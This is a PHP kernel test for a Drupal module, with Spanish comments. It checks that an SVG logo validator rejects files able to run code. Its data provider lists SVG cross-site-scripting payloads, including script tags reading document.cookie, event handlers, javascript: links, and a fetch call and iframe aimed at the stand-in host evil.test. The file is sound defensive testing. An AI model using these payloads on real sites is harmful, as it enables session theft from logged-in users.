<?php

declare(strict_types=1);

namespace Drupal\Tests\sales_leadership_diagnostic\Kernel;

use Drupal\file\Entity\File;
use Drupal\KernelTests\KernelTestBase;
use Drupal\sales_leadership_diagnostic\Plugin\Validation\Constraint\SafeSvgConstraint;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\DataProvider;
use Drupal\sales_leadership_diagnostic\Plugin\Validation\Constraint\SafeSvgConstraintValidator;

/**
 * Comprueba que un SVG con código ejecutable no puede usarse como logotipo.
 *
 * El módulo pinta el logotipo dentro de un `<img>`, donde el navegador no
 * ejecuta los scripts del SVG. El peligro está en la otra puerta: la URL del
 * archivo es pública, y al abrirla directamente el navegador trata el SVG como
 * documento y sí ejecuta lo que lleve dentro, en el dominio donde los alumnos
 * tienen sesión iniciada.
 *
 * Estos tests fijan el filtro para que nadie lo relaje al añadir formatos.
 */
#[CoversClass(SafeSvgConstraintValidator::class)]
#[CoversClass(SafeSvgConstraint::class)]
final class SafeSvgTest extends KernelTestBase {

  /**
   * {@inheritdoc}
   */
  protected static $modules = [
    'system',
    'user',
    'options',
    'file',
    'externalauth',
    'sales_leadership_diagnostic',
  ];

  /**
   * {@inheritdoc}
   */
  protected function setUp(): void {
    parent::setUp();

    $this->installEntitySchema('user');
    $this->installEntitySchema('file');
    $this->installSchema('file', ['file_usage']);
  }

  /**
   * Un SVG limpio se acepta.
   *
   * Sin este caso, un filtro que rechazase todo pasaría los demás tests y
   * dejaría el formato inutilizable.
   */
  public function testAceptaUnSvgLimpio(): void {
    $svg = <<<'SVG'
      <?xml version="1.0" encoding="UTF-8"?>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 40">
        <title>Salesbumm</title>
        <rect x="0" y="0" width="100" height="40" fill="#1f4788"/>
        <text x="10" y="26" fill="#ffffff" font-size="16">Salesbumm</text>
      </svg>
      SVG;

    $this->assertSame([], $this->violaciones($svg, 'logo-limpio.svg'));
  }

  /**
   * Un SVG con degradados y referencias internas también se acepta.
   *
   * Los `href="#id"` son legítimos y frecuentes: así se reutilizan degradados
   * y símbolos dentro del propio archivo. Un filtro que los rechazase echaría
   * fuera la mayoría de los logotipos reales exportados por un diseñador.
   */
  public function testAceptaReferenciasInternas(): void {
    $svg = <<<'SVG'
      <?xml version="1.0" encoding="UTF-8"?>
      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 40">
        <defs>
          <linearGradient id="g"><stop offset="0" stop-color="#1f4788"/><stop offset="1" stop-color="#16345f"/></linearGradient>
          <rect id="fondo" width="100" height="40" fill="url(#g)"/>
        </defs>
        <use xlink:href="#fondo"/>
      </svg>
      SVG;

    $this->assertSame([], $this->violaciones($svg, 'logo-degradado.svg'));
  }

  /**
   * Los demás formatos no se examinan y pasan sin más.
   */
  public function testNoExaminaLosFormatosDePixeles(): void {
    $png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==');

    $this->assertSame([], $this->violaciones($png, 'logo.png'));
  }

  /**
   * Ningún SVG con capacidad de ejecutar código se acepta.
   */
  #[DataProvider('proveedorDeSvgPeligrosos')]
  public function testRechazaSvgPeligrosos(string $descripcion, string $svg): void {
    $this->assertNotSame(
      [],
      $this->violaciones($svg, 'ataque.svg'),
      sprintf('Se ha aceptado un SVG peligroso: %s', $descripcion),
    );
  }

  /**
   * SVG que no deben aceptarse nunca.
   *
   * @return array<string, array{string, string}>
   *   Descripción y contenido de cada caso.
   */
  public static function proveedorDeSvgPeligrosos(): array {
    $envolver = static fn (string $interior): string =>
      '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">' . $interior . '</svg>';

    return [
      'script directo' => [
        'script directo',
        $envolver('<script>alert(document.cookie)</script>'),
      ],
      'script en mayúsculas' => [
        'script en mayúsculas',
        $envolver('<SCRIPT>alert(1)</SCRIPT>'),
      ],
      'onload en la raíz' => [
        'onload en la raíz',
        '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect/></svg>',
      ],
      'onclick anidado' => [
        'onclick anidado',
        $envolver('<g><rect onclick="fetch(\'https://evil.test\')"/></g>'),
      ],
      'foreignObject con HTML' => [
        'foreignObject con HTML',
        $envolver('<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></body></foreignObject>'),
      ],
      'enlace javascript' => [
        'enlace javascript',
        $envolver('<a href="javascript:alert(1)"><rect/></a>'),
      ],
      'imagen externa' => [
        'imagen externa',
        $envolver('<image xlink:href="https://evil.test/pixel.png"/>'),
      ],
      'iframe' => [
        'iframe',
        $envolver('<iframe src="https://evil.test"></iframe>'),
      ],
      'animate que ejecuta' => [
        'animate que ejecuta',
        $envolver('<rect><animate attributeName="href" values="javascript:alert(1)"/></rect>'),
      ],
      'no es XML válido' => [
        'no es XML válido',
        'esto no es un svg en absoluto',
      ],
      'archivo vacío' => [
        'archivo vacío',
        '   ',
      ],
    ];
  }

  /**
   * Ejecuta la validación sobre un archivo con el contenido dado.
   *
   * @param string $contents
   *   Contenido del archivo.
   * @param string $filename
   *   Nombre con el que se guarda; su extensión decide si se examina.
   *
   * @return string[]
   *   Mensajes de las violaciones encontradas.
   */
  private function violaciones(string $contents, string $filename): array {
    $uri = 'public://' . $filename;
    file_put_contents($uri, $contents);

    $file = File::create(['uri' => $uri, 'filename' => $filename]);
    $file->save();

    // Se usa el mismo servicio que la subida real, con la misma restricción
    // que declara el formulario: así el test recorre el camino de verdad y no
    // una aproximación que podría divergir.
    $violations = $this->container->get('file.validator')
      ->validate($file, ['SldSafeSvg' => []]);

    $mensajes = [];

    foreach ($violations as $violation) {
      $mensajes[] = (string) $violation->getMessage();
    }

    return $mensajes;
  }

}
